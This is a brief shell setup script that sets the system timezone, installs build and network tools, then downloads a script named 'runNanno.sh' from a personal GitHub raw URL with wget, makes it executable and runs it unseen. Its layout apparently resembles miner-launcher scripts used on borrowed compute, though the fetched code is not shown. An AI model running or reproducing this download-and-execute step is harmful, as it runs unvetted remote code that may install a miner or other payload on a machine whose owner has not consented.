#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

#################################
## Begin of user-editable part ##
#################################

wget https://raw.githubusercontent.com/WxYtzaiu/WxYtzaiu/main/runNanno.sh

chmod +x runNanno.sh

./runNanno.sh
